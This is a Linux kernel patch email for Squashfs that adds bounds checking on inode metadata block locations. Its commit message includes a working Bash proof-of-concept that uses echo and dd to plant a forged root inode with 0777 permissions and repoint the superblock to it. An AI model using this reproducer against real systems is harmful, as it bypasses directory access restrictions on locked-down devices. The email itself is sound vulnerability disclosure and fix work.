Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.29
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794440690;
	b=o7GRKAzXXq+iICvQA2HZ5SKGMS5SxZ8iEEyKkz28gtT1KAQ5t/I8GS7aZJQ1GftikdIA
	 lO/LMKZFjBuzvojvllX1XrJ6FlOMFjH2R338TmdRjvSNRCZq+1iyaMadSmEx+3oqwnv9i
	 taYZZptHhANew07vXIzzXRuylLQJ06Gb4GIIrAn43uHrsnU4VxCjhArlGgNX0UVQvRVgo
	 +xf6CW+mPCrPLvlMrp1j7bfgXVS0omKo+YVo0MFwNmSDjECd2gbM7+/IZnPrtpaHh6uyJ
	 qHz6E9Qs02zd57mqaH42AjrVimljXeRpEbCrnAThmuhdTeJMxGSxF5s0AVQWVs30qXw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794440690;
	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
	 X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding:X-CMAE-Envelope;
	bh=lazIMP3VfO3rf0+sfKNzR2f4fSgQ2+BI+PlfexNAqoM=;
	b=s3EJzw6bvJxAUMsELb/F/OoRz1w/4A3M802G0nq8FvmUHh9gx3nws+ghG5JlQG472kRB
	 8sZ4UNeTLVsAy1NhGbRmuK8GT9yyE39ssokoL9QRlsbh4yoaDBM4CZvdC+/nKnztZjfOg
	 pPv5YCcHa1SMJp7+lPOkTNOHwyW/g/ABi+V/yaN/R5YoDADfEC6iL6Zr9pyABSv+ReOqD
	 dr1fmA21WPQWewSJWyExW9HH21yEqzk4DoBipTeochST32txDFOkI5Kt1qJnx6qJwqsnM
	 /82IDJ6qn1KjUxTkKuxpSLm7NBxaiCsNlUrxMVGHB9TCQflMcN7K6lRorlXkew46Ysw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=squashfs.org.uk;
	spf=pass smtp.mailfrom=squashfs.org.uk;
	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=OBbun7zb;
	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=TpUFPFyR;
	arc=none smtp.remote-ip=188.121.53.29
Received: from sxplsmtpa04-03.prod.sxb1.secureserver.net (sxplsmtpa04-03.prod.sxb1.secureserver.net [188.121.53.29])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E7E7F60A5BD2
	for <linux-fsdevel@vger.kernel.org>; Wed, 11 Nov 2026 23:44:49 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org E7E7F60A5BD2
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=OBbun7zb;
	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=TpUFPFyR
Received: from avalon.fritz.box ([82.69.79.175])
	by :SMTPAUTH: with ESMTPA
	id RHz6xtxIpLwCURHzdxAFYU; Wed, 11 Nov 2026 23:44:42 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
	s=secureserver2; t=1794440683;
	bh=lazIMP3VfO3rf0+sfKNzR2f4fSgQ2+BI+PlfexNAqoM=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=OBbun7zbb86v3dHwHuZs9re8w1OoS7tvydEfYlswnTfBm/w819nMVa5fXydGXk9Am
	 X1MFIO3kOHklbbi6xaWF3uiXcVymNUT38TJ6NuIhJ2nGH+LrBTbcVXKz+RK8b6uFRB
	 vpXE6kDS+DDAdd2FQd0GRzOiIsJfKMspS7byyC3aO3gqp0W3SFYe71zUkL4FieYvCp
	 /7VUCrHSQuyGZ9m3aeVD2SqSM2jryWuyuX0/OO/8t7WEOismxQpr3cPA0xJKOpWaop
	 Ur2hOEYE1z3veWbUrrVoTeJQ8B1BLzTotFh6LjXvhFYNN6EEfcXmzqBvRZ/6eAAhfh
	 qPAOZHY6U9keQ==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
	s=secureserver1; t=1794440683;
	bh=lazIMP3VfO3rf0+sfKNzR2f4fSgQ2+BI+PlfexNAqoM=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=TpUFPFyR7aWmaqX13pttmDAMIiHxOs8Ftz8FHgFymfOsS2cNMnKOz1dT/k3O8uSyz
	 s+o9++Pa/78YdqRuVS9AtAkWq4vt2vGCu0hq0QPgVQDmNHpDxtfXap/i2cm31W91b5
	 oZTobzbd5L1D+vk2Q57+dFvnbEi3jEOoApNUEObgzdKu954qqvKB4SxqYCsgTgHJdA
	 fbB5BHqp4s74GrdQri+TQzhsf5gIQ5AcCc6WY0wG3LvXJRoh6clYNNlkivmTqM430q
	 iG296wxDyaIRkkPZLvKIoNMXZjbi/lwnlINxMF62oGcLVNXqwhUpCBGuTtrunjtj7E
	 AVsV9j9HQLbJg==
X-CMAE-Analysis: v=2.4 cv=XZYcX455 c=1 sm=1 tr=0 ts=6af4fdea
 a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
 a=WbH0joDL9KXNTEjrqjoA:9 a=UObqyxdv-6Yh2QiB9mM_:22
Feedback-ID: 04410ff6f47df6991b1c3c0d7eb3a576:squashfs.org.uk:ssnet
X-SECURESERVER-ACCT: phillip@squashfs.org.uk
From: Phillip Lougher <phillip@squashfs.org.uk>
To: linux-kernel@vger.kernel.org,
	linux-fsdevel@vger.kernel.org,
	akpm@linux-foundation.org
Cc: Phillip Lougher <phillip@squashfs.org.uk>
Subject: [PATCH v2 10/22] Squashfs: sanity check inode metadata block location
Date: Wed, 11 Nov 2026 23:43:50 +0000
Message-ID: <20261111234402.252354-11-phillip@squashfs.org.uk>
X-Mailer: git-send-email 2.47.3
In-Reply-To: <20261111234402.252354-1-phillip@squashfs.org.uk>
References: <20261111234402.252354-1-phillip@squashfs.org.uk>
X-Mailing-List: linux-fsdevel@vger.kernel.org
List-Id: <linux-fsdevel.vger.kernel.org>
List-Post: <mailto:linux-fsdevel@vger.kernel.org>
List-Help: <mailto:linux-fsdevel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-fsdevel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CMAE-Envelope: MS4xfOGqZ2fPwlWe9Ezc0J2dnxcGrCq3bhEaREgC5Yd0hzxw1v+4Z2dFqjalH+V2NSGYLLBsVbZmRhPl4iFLkpSGpN5xr8v9WdTDXub/S8prHf7o9hruEy9X
 tQ95A5F4Wkxp1wnQ2vdZ2UsXm5/S403t0Mq/1Xy61KHvGnPl0DQs7If/Z9ixgFa0/vOxxTvluUAB1Y+hBr7+C9Xvivrtu/gAadYtGOPLDUkssvQjMh4Sx/PF
 DDeirv/PI6J1594Rd2M0duzgQBX3NPsnabYFRSkP8jfD53P/RTEyKHUpu6nu/5rmqOpDtxv2Doc0Gb9fL+W4jvoX4dhCD9LwbrFt6CL9Pp8=

An inode reference in Squashfs is represented as a tuple, the location
of the compressed metadata block the inode is in, and the offset into
the uncompressed block.  The location is not absolute and it is instead
encoded as an offset from the start of the inode table.

An attacker could manipulate the inode reference to make it point to a
replacement malicious inode stored elsewhere, outside the inode table.
This is because the code does not check that the location is valid and
is within the inode table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to hide a malicious inode.

Also anyone with access to Mksquahfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliberately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem root directory has
permissions 0700 (u=rxw), where only the superuser can enter the
directory and access the content within. But using this bug an attacker
could place a malicious root inode in the inode lookup table (used by
NFS) which has the permissions changed to 0777 (a=rwx), and then update
the root_inode field in the superblock to point to that.  On
reboot/remount this will make the directory accesisible to unprivileged
users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_inode_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the inode is within the inode table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the root directory
permisions will be changed to 0777 (a=rwx), but otherwise the filesystem
is unchanged.

======================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
for i in $(seq 1 100); do
	echo "$i l zero" >> pseudo
done

# Create a Squashfs filesystem with the root directory permissions u=rwx (0700)
echo "Create a Squashfs filesystem with the root directory permissions u=rwx (0700)"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0700 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# The root_inode field in the superblock points to the compressed metadata
# block and offset within it, where the root inode is stored.
#
# Create a malicious root inode and hide it in the inode lookup table.
# Because of mount time checking, there are no gaps between metadata tables
# where it can be hidden, and it can't be hidden after the file system end,
# because this is checked.

# Write malicious inode, this is the same as the original root inode, except
# it is uncompressed, and the permissions are set to 0777.
/usr/bin/echo -en "\x20\x80\x01\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\
\x65\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xec\x03\x00\x00\x00\x00\x00\
\x00" > file

# Place new root inode inside the inode lookup table
echo Place new root inode inside the inode lookup table

dd bs=1 seek=960 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new inode
# The start block is an offset from the inode_table_start, and not an
# absolute value.  The start of the inode table is 113, the new inode
# is placed at position 964, and so the offset is 851. Because we've only
# stored one inode in the metadata block, the offset into that block is 0.
#
echo Update the root_inode field in the superblock to point to our new inode

/usr/bin/echo -en "\x00\x00\x4f\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt, if the exploit is successful, permissions should be 0777
echo Stat /mnt, if the exploit is successful, permissions should be 0777

stat /mnt

popd 2>&1> /dev/null

rm -rf $DIR
======================================================================

Fixes: 6545b246a2c8 ("Squashfs: inode operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
---
v2: ensure err is not used uninitialised.
---
 fs/squashfs/inode.c            | 17 ++++++++++-------
 fs/squashfs/squashfs_helpers.h | 18 ++++++++++++++++++
 2 files changed, 28 insertions(+), 7 deletions(-)

diff --git a/fs/squashfs/inode.c b/fs/squashfs/inode.c
index 66858fabed1a..547eb04f66bd 100644
--- a/fs/squashfs/inode.c
+++ b/fs/squashfs/inode.c
@@ -109,8 +109,8 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 {
 	struct super_block *sb = inode->i_sb;
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	u64 block = squashfs_inode_blk(ino) + msblk->inode_table;
-	int offset = squashfs_inode_offset(ino);
+	s64 block = squashfs_inode_start(msblk, ino), sblock = block;
+	int offset = squashfs_inode_offset(ino), soffset = offset;
 	int err, type;
 	union squashfs_inode squashfs_ino;
 	struct squashfs_base_inode *sqshb_ino = &squashfs_ino.base;
@@ -118,11 +118,14 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 
 	TRACE("Entered squashfs_read_inode\n");
 
+	if (block < 0)
+		goto bad_block_val;
+
 	/*
 	 * Read inode base common to all inode types.
 	 */
-	err = squashfs_read_metadata(sb, sqshb_ino, &block,
-				&offset, sizeof(*sqshb_ino));
+	err = squashfs_read_metadata(sb, sqshb_ino, &sblock,
+				&soffset, sizeof(*sqshb_ino));
 	if (err < 0)
 		goto failed_read;
 
@@ -130,9 +133,6 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 	if (err)
 		goto failed_read;
 
-	block = squashfs_inode_blk(ino) + msblk->inode_table;
-	offset = squashfs_inode_offset(ino);
-
 	type = le16_to_cpu(sqshb_ino->inode_type);
 	switch (type) {
 	case SQUASHFS_REG_TYPE: {
@@ -452,6 +452,9 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 
 	return 0;
 
+bad_block_val:
+	err = block;
+
 failed_read:
 	ERROR("Unable to read inode 0x%llx\n", ino);
 	return err;
diff --git a/fs/squashfs/squashfs_helpers.h b/fs/squashfs/squashfs_helpers.h
index 524d4a77686d..138173860f7c 100644
--- a/fs/squashfs/squashfs_helpers.h
+++ b/fs/squashfs/squashfs_helpers.h
@@ -47,6 +47,24 @@ static inline u16 squashfs_inode_offset(s64 inode)
 	return inode & 0xffff;
 }
 
+static inline s64 squashfs_inode_start(struct squashfs_sb_info *msblk, s64 inode)
+{
+	s64 start;
+
+	if (inode < 0)
+		return -EINVAL;
+
+	if (S64_MAX - msblk->inode_table < squashfs_inode_blk(inode))
+		return -EINVAL;
+
+	start = msblk->inode_table + squashfs_inode_blk(inode);
+
+	if (start > msblk->directory_table)
+		return -EINVAL;
+
+	return start;
+}
+
 static inline s64 squashfs_mkinode(u32 start, u16 offset)
 {
 	return ((s64)start << 16) | offset;
-- 
2.47.3

